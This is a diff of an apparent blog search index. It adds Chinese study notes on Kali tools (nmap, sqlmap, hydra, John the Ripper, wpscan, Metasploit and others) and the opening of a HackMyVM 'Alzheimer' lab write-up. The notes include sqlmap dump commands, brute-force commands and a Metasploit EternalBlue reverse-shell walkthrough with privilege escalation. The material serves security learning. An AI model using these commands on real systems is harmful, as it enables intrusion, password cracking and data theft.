@@ -6,6 +6,501 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title>kali工具笔记</title>
+    <url>/posts/15173.html</url>
+    <content><![CDATA[<p>kali工具笔记</p>
+<span id="more"></span>
+<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>Nmap 是一个强大的端口扫描工具，默认扫描端口范围 1-1024。</p>
+<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-sn</code> 或 <code>-sP</code></td>
+<td>进行主机探测（Ping 扫描）。</td>
+</tr>
+<tr>
+<td>无参数</td>
+<td>更详细的扫描，可以获取端口信息。</td>
+</tr>
+<tr>
+<td><code>-p-</code></td>
+<td>扫描所有端口（有时 Ping 不一定能扫出）。</td>
+</tr>
+<tr>
+<td><code>-p &lt;端口&gt;</code></td>
+<td>指定端口扫描，可与 <code>--script=banner</code> 或 <code>-A</code> 结合使用。</td>
+</tr>
+<tr>
+<td><code>-sU</code></td>
+<td>扫描 UDP 端口，探测目标上的服务。</td>
+</tr>
+<tr>
+<td><code>-A</code></td>
+<td>启用高级检测，包括操作系统检测、版本检测、脚本扫描和路由跟踪。</td>
+</tr>
+<tr>
+<td><code>-sS</code></td>
+<td>进行半开放式（SYN）扫描，适用于快速端口扫描。</td>
+</tr>
+<tr>
+<td><code>-sT</code></td>
+<td>进行完整连接（TCP 连接）扫描，适用于没有特权的用户。</td>
+</tr>
+<tr>
+<td><code>-sV</code></td>
+<td>探测端口服务版本信息。</td>
+</tr>
+<tr>
+<td><code>-O</code></td>
+<td>进行操作系统检测。</td>
+</tr>
+<tr>
+<td><code>--script=&lt;脚本&gt;</code></td>
+<td>使用 Nmap 脚本引擎（NSE），如 <code>--script=vuln</code> 进行漏洞扫描。</td>
+</tr>
+<tr>
+<td><code>-T&lt;0-5&gt;</code></td>
+<td>设置扫描速度，<code>T0</code> 最慢，<code>T5</code> 最快。</td>
+</tr>
+<tr>
+<td><code>-Pn</code></td>
+<td>跳过 Ping 检测，直接扫描目标主机（适用于防火墙屏蔽 Ping 的情况）。</td>
+</tr>
+</tbody></table>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>SQLMap 是一个自动化 SQL 注入漏洞检测工具</p>
+<h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-u &lt;URL&gt;</code></td>
+<td>指定目标 URL，例如 <code>-u &quot;http://example.com?id=1&quot;</code>。</td>
+</tr>
+<tr>
+<td><code>--data &quot;&lt;参数&gt;&quot;</code></td>
+<td>用于 POST 请求的参数数据，例如 <code>--data &quot;user=admin&amp;pass=123&quot;</code>。</td>
+</tr>
+<tr>
+<td><code>--cookie &quot;&lt;cookie&gt;&quot;</code></td>
+<td>指定请求的 Cookie，例如 <code>--cookie &quot;PHPSESSID=12345&quot;</code>。</td>
+</tr>
+<tr>
+<td><code>-p &lt;参数&gt;</code></td>
+<td>指定测试的参数，例如 <code>-p id</code> 只测试 <code>id</code> 参数。</td>
+</tr>
+<tr>
+<td><code>--level=&lt;1-5&gt;</code></td>
+<td>设置测试强度，默认 <code>1</code>，<code>5</code> 最彻底但较慢。</td>
+</tr>
+<tr>
+<td><code>--risk=&lt;1-3&gt;</code></td>
+<td>设置风险级别，<code>1</code> 为低，<code>3</code> 为高。</td>
+</tr>
+<tr>
+<td><code>--dbs</code></td>
+<td>枚举目标数据库名称。</td>
+</tr>
+<tr>
+<td><code>--tables</code></td>
+<td>列出目标数据库中的表，需要结合 <code>-D &lt;数据库名&gt;</code> 使用。</td>
+</tr>
+<tr>
+<td><code>--columns</code></td>
+<td>列出表中的列名，需要结合 <code>-D &lt;数据库名&gt; -T &lt;表名&gt;</code> 使用。</td>
+</tr>
+<tr>
+<td><code>--dump</code></td>
+<td>导出表中的数据，需要结合 <code>-D &lt;数据库名&gt; -T &lt;表名&gt;</code> 使用。</td>
+</tr>
+<tr>
+<td><code>--batch</code></td>
+<td>跳过交互提示，自动选择默认选项，适用于脚本化操作。</td>
+</tr>
+<tr>
+<td><code>--threads &lt;N&gt;</code></td>
+<td>设置扫描线程数，提高扫描速度（默认为 <code>1</code>，建议 <code>3-5</code>）。</td>
+</tr>
+<tr>
+<td><code>--os-shell</code></td>
+<td>获取操作系统 Shell（如果目标数据库具有命令执行权限）。</td>
+</tr>
+<tr>
+<td><code>--tamper &lt;脚本&gt;</code></td>
+<td>使用 <code>tamper</code> 脚本（如 <code>--tamper=space2comment</code>）绕过某些安全防护。</td>
+</tr>
+</tbody></table>
+<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> <span class="comment">--dbs</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db <span class="comment">--tables</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db -T users <span class="comment">--columns</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db -T users -C xxxx <span class="comment">--dump</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><p>在 Kali Linux 中，<strong>John the Ripper</strong> 是一个强大的密码破解工具，用于测试密码强度</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">john [选项] <span class="tag">&lt;<span class="name">文件</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>–wordlist&#x3D;&lt;文件&gt;：指定密码字典。<br>默认字典位置：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<br>破解结果存储在 ~&#x2F;.john&#x2F;john.pot。</p>
+<h3 id="常用参数-2"><a href="#常用参数-2" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--wordlist=&lt;文件&gt;</code></td>
+<td>使用指定的密码字典进行破解。</td>
+</tr>
+<tr>
+<td><code>--rules</code></td>
+<td>启用规则扩展（对字典进行变形，提高成功率）。</td>
+</tr>
+<tr>
+<td><code>--format=&lt;格式&gt;</code></td>
+<td>指定哈希格式，如 <code>md5crypt</code>、<code>sha512crypt</code>、<code>nt</code>、<code>zip</code>。</td>
+</tr>
+<tr>
+<td><code>--show</code></td>
+<td>显示已破解的密码。</td>
+</tr>
+<tr>
+<td><code>--incremental</code></td>
+<td>使用增量模式（自动生成候选密码）。</td>
+</tr>
+<tr>
+<td><code>--session=&lt;名称&gt;</code></td>
+<td>指定会话名称，可暂停后续继续破解。</td>
+</tr>
+<tr>
+<td><code>--restore=&lt;名称&gt;</code></td>
+<td>恢复指定会话的破解进度。</td>
+</tr>
+<tr>
+<td><code>--fork=&lt;N&gt;</code></td>
+<td>启用 <code>N</code> 个进程进行并行破解，提高速度。</td>
+</tr>
+<tr>
+<td><code>--single</code></td>
+<td>使用用户名作为密码的基础进行单模式破解。</td>
+</tr>
+<tr>
+<td><code>--stdout</code></td>
+<td>仅生成候选密码，不进行破解（测试字典效果）。</td>
+</tr>
+</tbody></table>
+<h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">john <span class="attribute">--wordlist</span>=rockyou.txt <span class="attribute">--format</span>=raw-md5 hashes.txt</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p><strong>WPScan</strong> 是一个专注于 WordPress 安全性的开源工具，用于扫描 WordPress 网站的安全漏洞。它可以帮助管理员识别网站中可能存在的安全问题，例如已知的插件或主题漏洞、弱密码、以及错误的配置</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> &lt;target_url&gt; <span class="selector-attr">[选项]</span></span><br></pre></td></tr></table></figure></div>
+<p>现在都需要到官网注册 然后得到api-token 才能获得扫描之后的详细结果</p>
+<h3 id="常用参数-3"><a href="#常用参数-3" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--url &lt;URL&gt;</code></td>
+<td>指定目标网站的 URL。</td>
+</tr>
+<tr>
+<td><code>--enumerate &lt;OPTION&gt;</code></td>
+<td>枚举 WordPress 的用户、插件、主题等（详细选项见下方）。</td>
+</tr>
+<tr>
+<td><code>--api-token &lt;TOKEN&gt;</code></td>
+<td>使用 WPScan API Token 获取更详细的漏洞数据。</td>
+</tr>
+<tr>
+<td><code>--random-user-agent</code></td>
+<td>使用随机的 User-Agent 模拟真实用户访问，避免被目标网站屏蔽。</td>
+</tr>
+<tr>
+<td><code>--passwords &lt;FILE&gt;</code></td>
+<td>指定密码字典文件，用于密码暴力破解。</td>
+</tr>
+<tr>
+<td><code>--usernames &lt;FILE&gt;</code></td>
+<td>指定用户名字典文件，用于密码暴力破解。</td>
+</tr>
+<tr>
+<td><code>--ignore-main-redirect</code></td>
+<td>忽略网站的 URL 重定向。</td>
+</tr>
+<tr>
+<td><code>--verbose</code></td>
+<td>显示详细的输出信息。</td>
+</tr>
+</tbody></table>
+<p>通过 <code>--enumerate</code> 参数，可以枚举 WordPress 网站的不同组件：</p>
+<table>
+<thead>
+<tr>
+<th>枚举选项</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>u</code></td>
+<td>枚举用户（尝试查找用户名）。</td>
+</tr>
+<tr>
+<td><code>p</code></td>
+<td>枚举插件及其漏洞信息。</td>
+</tr>
+<tr>
+<td><code>t</code></td>
+<td>枚举主题及其漏洞信息。</td>
+</tr>
+<tr>
+<td><code>vp</code></td>
+<td>枚举有漏洞的插件（需要 API 支持）。</td>
+</tr>
+<tr>
+<td><code>vt</code></td>
+<td>枚举有漏洞的主题（需要 API 支持）。</td>
+</tr>
+<tr>
+<td><code>ap</code></td>
+<td>显示所有插件。</td>
+</tr>
+<tr>
+<td><code>at</code></td>
+<td>显示所有主题。</td>
+</tr>
+</tbody></table>
+<p>密码破解</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">wpscan <span class="params">--url</span> https:<span class="string">//example.com</span> -P passwords.txt -U users.txt</span><br></pre></td></tr></table></figure>
+<h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><p><strong>WFuzz</strong> 是一款开源的 Web 应用模糊测试工具，专为渗透测试设计。它的主要功能是通过暴力破解和模糊测试技术，枚举和发现 Web 应用中的隐藏内容或漏洞，比如：</p>
+<ol>
+<li><strong>目录和文件枚举</strong>：发现网站的隐藏目录或敏感文件。</li>
+<li><strong>参数枚举</strong>：测试 Web 应用中可能存在的隐藏参数。</li>
+<li><strong>凭据爆破</strong>：用于暴力破解登录页面。</li>
+<li><strong>漏洞检测</strong>：检测 SQL 注入、XSS、命令注入等安全漏洞。</li>
+<li><strong>HTTP 请求自定义</strong>：允许用户灵活自定义 HTTP 请求，实现高级模糊测试。<br><strong><code>-u/--url</code></strong>   指定目标 URL，并在其中插入 <code>FUZZ</code> 占位符，WFuzz 会用字典内容替换 <code>FUZZ</code> 进行请求。<br><code>wfuzz -u http://example.com/FUZZ</code><br>默认自带呢位置在&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist</li>
+</ol>
+<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>Binwalk 是一个用于分析文件的工具，常用于隐写分析。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">binwalk -e &lt;文件&gt; <span class="attribute">--run-as</span>=root</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Dos2Unix"><a href="#Dos2Unix" class="headerlink" title="Dos2Unix"></a>Dos2Unix</h2><p>用于将 Windows 文本文件转换为 Unix 格式。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">dos2unix <span class="tag">&lt;<span class="name">文件</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="SearchSploit"><a href="#SearchSploit" class="headerlink" title="SearchSploit"></a>SearchSploit</h2><p>SearchSploit 用于搜索 Exploit-DB 漏洞利用代码。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">searchsploit <span class="tag">&lt;<span class="name">漏洞或软件名</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>漏洞利用文件存放目录：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Metasploit-msfconsole"><a href="#Metasploit-msfconsole" class="headerlink" title="Metasploit (msfconsole)"></a>Metasploit (msfconsole)</h2><p><code>msfconsole</code> 是 <strong>Metasploit Framework</strong> 的命令行界面，Metasploit 是一个用于开发和执行漏洞利用代码的开源工具。它广泛用于渗透测试、安全评估以及漏洞分析。<code>msfconsole</code> 提供了一个强大的命令行环境，允许用户快速访问各种安全测试功能。<br>以下是一些常见的命令及其说明：</p>
+<h3 id="常用参数-4"><a href="#常用参数-4" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>show</code></td>
+<td>列出可用的 payloads&#x2F;exploits。</td>
+</tr>
+<tr>
+<td><code>set &lt;选项&gt;</code></td>
+<td>设置攻击参数。</td>
+</tr>
+<tr>
+<td><code>unset &lt;选项&gt;</code></td>
+<td>取消选项设置。</td>
+</tr>
+<tr>
+<td><code>exploit</code></td>
+<td>运行漏洞利用。</td>
+</tr>
+<tr>
+<td><code>sessions</code></td>
+<td>管理会话。</td>
+</tr>
+<tr>
+<td><code>info</code></td>
+<td>查看模块详细信息。</td>
+</tr>
+<tr>
+<td><code>search &lt;名称&gt;</code></td>
+<td>搜索漏洞。</td>
+</tr>
+<tr>
+<td><code>use &lt;模块&gt;</code></td>
+<td>选择漏洞模块。</td>
+</tr>
+<tr>
+<td><code>db_nmap</code></td>
+<td>运行 Nmap 并保存结果。</td>
+</tr>
+<tr>
+<td><code>exit</code> 或 <code>quit</code></td>
+<td>退出 Metasploit。</td>
+</tr>
+</tbody></table>
+<h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 启动 Metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 搜索漏洞</span></span><br><span class="line">search smb</span><br><span class="line"><span class="comment"># 该命令搜索与 SMB 相关的漏洞利用模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 选择漏洞模块</span></span><br><span class="line">use exploit<span class="regexp">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 选择 EternalBlue（MS17-010）漏洞利用模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 查看模块详细信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># 显示当前模块的详细说明和可用选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 设置攻击目标</span></span><br><span class="line">set RHOSTS <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"><span class="comment"># 目标 IP 地址</span></span><br><span class="line"></span><br><span class="line">set RPORT <span class="number">445</span></span><br><span class="line"><span class="comment"># 选择目标端口 445（SMB 端口）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 设置本地攻击机的回连（反向 shell）</span></span><br><span class="line">set LHOST <span class="number">192.168</span>.<span class="number">1.50</span></span><br><span class="line"><span class="comment"># 设置攻击者的 LHOST</span></span><br><span class="line"></span><br><span class="line">set LPORT <span class="number">4444</span></span><br><span class="line"><span class="comment"># 选择本地监听端口 4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 运行漏洞利用</span></span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># 启动漏洞攻击，如果成功，则会获得目标主机的 meterpreter shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 监听和管理会话</span></span><br><span class="line">sessions -l</span><br><span class="line"><span class="comment"># 列出当前活跃的会话</span></span><br><span class="line"></span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line"><span class="comment"># 进入 ID 为 1 的会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. 获取系统权限</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment"># 尝试提升权限到 SYSTEM 级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. 获取目标系统信息</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 查看目标系统信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. 获取目标主机的 Shell</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 进入目标系统的命令行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12. 运行 Nmap 并保存扫描结果</span></span><br><span class="line">db_nmap -sV -p <span class="number">80</span>,<span class="number">443</span>,<span class="number">445</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line"><span class="comment"># 扫描 192.168.1.0/24 网络的 80, 443, 445 端口，并保存结果到数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 13. 退出 Metasploit</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"><span class="comment"># 退出 msfconsole</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h2><p>Cewl 是一个爬虫工具，可以抓取网站内容并生成密码字典。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">cewl -w <span class="tag">&lt;<span class="name">输出文件</span>&gt;</span> -d <span class="tag">&lt;<span class="name">深度</span>&gt;</span> <span class="tag">&lt;<span class="name">URL</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>使用frackzip破解压缩包</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fcrackzip</span> -b -c <span class="number">1</span> -l <span class="number">1</span>-<span class="number">6</span> -p <span class="number">0</span> -u <span class="number">1</span>.zip</span><br></pre></td></tr></table></figure></div>
+<p>-b：使用暴力破解模式。</p>
+<p>-c 1：限制密码仅包含数字字符。</p>
+<p>-l 1-6：限制密码长度在 1 到 6 个字符之间。</p>
+<p>-p 0：初始化破解起点为 0。</p>
+<p>-u：显示破解出来的密码。</p>
+<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>Hydra 是一个多协议暴力破解工具。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">hydra -L <span class="tag">&lt;<span class="name">用户名列表</span>&gt;</span> -P <span class="tag">&lt;<span class="name">密码列表</span>&gt;</span> <span class="tag">&lt;<span class="name">协议</span>&gt;</span>://<span class="tag">&lt;<span class="name">目标</span>&gt;</span>:<span class="tag">&lt;<span class="name">端口</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>支持 SSH、FTP、HTTP 等协议。</p>
+<h3 id="常用参数-5"><a href="#常用参数-5" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-L &lt;文件&gt;</code></td>
+<td>指定包含多个用户名的文件。</td>
+</tr>
+<tr>
+<td><code>-L &lt;用户名&gt;</code></td>
+<td>指定单个用户名。</td>
+</tr>
+<tr>
+<td><code>-P &lt;文件&gt;</code></td>
+<td>指定包含多个密码的文件。</td>
+</tr>
+<tr>
+<td><code>-p &lt;密码&gt;</code></td>
+<td>指定单个密码。</td>
+</tr>
+<tr>
+<td><code>-t &lt;线程数&gt;</code></td>
+<td>指定线程数，默认为16。可以增加来提高破解速度，但过高可能会被目标封禁或造成网络问题。</td>
+</tr>
+<tr>
+<td><code>-o &lt;文件&gt;</code></td>
+<td>将破解成功的结果保存到指定文件中。</td>
+</tr>
+</tbody></table>
+<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><p><code>gobuster</code> 是一个用 Go 语言编写的目录 &#x2F; 文件扫描工具，常用于渗透测试和安全审计中，目的是通过暴力破解或字典攻击来发现 Web 服务器上的隐藏目录和文件。<br><code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code><br>默认字典目录在<code>/usr/share/wordlists/dirbuster/</code> 下<br>-s 指定要显示的http状态码   -t指定线程 一般用50 60<br>字典位置：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;<br><img src="https://pic1.imgdb.cn/item/679b3f5ed0e0a243d4f8ac2d.png"><br>一般是dirsearch没有发现有用的内容的时候用这个扫描器  用这个 medium字典</p>
+<h2 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h2><p><strong><code>enum4linux</code></strong> 是一款用于 Linux 系统上的 SMB（Server Message Block）协议枚举工具，常用于网络安全测试中进行 Windows 系统的枚举。它能够帮助渗透测试人员获取有关 Windows 系统的详细信息，例如共享资源、用户账户、操作系统版本、域名等。<br>功能和smbmap差不多</p>
+<h3 id="常用参数和示例"><a href="#常用参数和示例" class="headerlink" title="常用参数和示例"></a>常用参数和示例</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>enum4linux -S &lt;target_ip&gt;</code></td>
+<td>列出目标系统的共享资源。</td>
+</tr>
+<tr>
+<td><code>smbmap -H &lt;target_ip&gt;</code></td>
+<td>列出目标系统的共享资源（替代 <code>enum4linux -S</code>）。</td>
+</tr>
+<tr>
+<td><code>enum4linux -O &lt;target_ip&gt;</code></td>
+<td>获取目标 Windows 系统的操作系统版本。</td>
+</tr>
+<tr>
+<td><code>enum4linux -U &lt;target_ip&gt;</code></td>
+<td>列出目标计算机上的所有用户账户。</td>
+</tr>
+<tr>
+<td><code>enum4linux -P &lt;target_ip&gt;</code></td>
+<td>获取目标主机上用户的登录历史信息。</td>
+</tr>
+<tr>
+<td><code>enum4linux -A &lt;target_ip&gt;</code></td>
+<td>请求更多的枚举信息，包括共享、用户等数据。</td>
+</tr>
+<tr>
+<td><code>enum4linux -G &lt;target_ip&gt;</code></td>
+<td>获取目标系统上组的相关信息。</td>
+</tr>
+</tbody></table>
+<h2 id="stegseek"><a href="#stegseek" class="headerlink" title="stegseek"></a>stegseek</h2><p>Stegseek 是一款快速的 <strong>JPEG 隐写分析工具</strong>，专门用于破解 <code>steghide</code> 隐写的图片文件。它可以 <strong>高效爆破密码</strong>，并提取隐藏数据。</p>
+<p>Stegseek 主要功能包括：</p>
+<ul>
+<li><p><strong>快速爆破密码</strong>：基于字典的攻击，速度极快。</p>
+</li>
+<li><p><strong>提取隐藏数据</strong>：无需密码时，尝试默认密码或空密码提取。</p>
+</li>
+<li><p><strong>检查图片是否含有隐写数据</strong>。</p>
+</li>
+</ul>
+<h3 id="常用参数-6"><a href="#常用参数-6" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-sf</code>, <code>--stegofile</code></td>
+<td>选择隐写文件</td>
+</tr>
+<tr>
+<td><code>-wl</code>, <code>--wordlist</code></td>
+<td>选择密码字典文件，用于暴力破解</td>
+</tr>
+<tr>
+<td><code>-xf</code>, <code>--extractfile</code></td>
+<td>指定提取数据时的文件名</td>
+</tr>
+<tr>
+<td><code>-t</code>, <code>--threads</code></td>
+<td>设定线程数量，默认为 CPU 核心数</td>
+</tr>
+<tr>
+<td><code>-f</code>, <code>--force</code></td>
+<td>强制覆盖已存在的文件</td>
+</tr>
+<tr>
+<td><code>-v</code>, <code>--verbose</code></td>
+<td>显示详细信息</td>
+</tr>
+<tr>
+<td><code>-q</code>, <code>--quiet</code></td>
+<td>隐藏性能指标（可能提升性能）</td>
+</tr>
+<tr>
+<td><code>-s</code>, <code>--skipdefault</code></td>
+<td>不使用默认猜测（如空密码、文件名等）</td>
+</tr>
+<tr>
+<td><code>-n</code>, <code>--nocolor</code></td>
+<td>禁用终端输出的颜色</td>
+</tr>
+<tr>
+<td><code>-c</code>, <code>--continue</code></td>
+<td>在找到结果后继续破解（可能存在多个嵌入文件）</td>
+</tr>
+<tr>
+<td><code>-a</code>, <code>--accessible</code></td>
+<td>简化输出，使其更适用于屏幕阅读器</td>
+</tr>
+</tbody></table>
+<p>一般指定rockyou字典就可以</p>
+]]></content>
+      <categories>
+        <category>linux</category>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>操作系统</tag>
+        <tag>kali</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>linux基础指令笔记</title>
     <url>/posts/11168.html</url>
     <content><![CDATA[<p>linux基础指令学习笔记</p>
@@ -137,6 +632,33 @@
         <tag>linux</tag>
         <tag>操作系统</tag>
         <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HMV-Alzheimer</title>
+    <url>/posts/16384.html</url>
+    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
+<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>三个端口  只有21端口现在是开放的  80和22都是有防火墙<br>先尝试能不能匿名登录ftp  然后上传反弹shell文件<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>发现有一个.secretnote.txt 下载到本地查看<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>提示我们要用knock服务 按这个顺序发送请求包才能打开端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
+<p>但是敲门之后还是无法打开两个端口  查了wp  发现和橘墨大佬的问题一样 因为我修改过网卡，所以去修改靶机的knockd配置文件<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>修改配置文件之后在knock就可以访问80端口了</p>
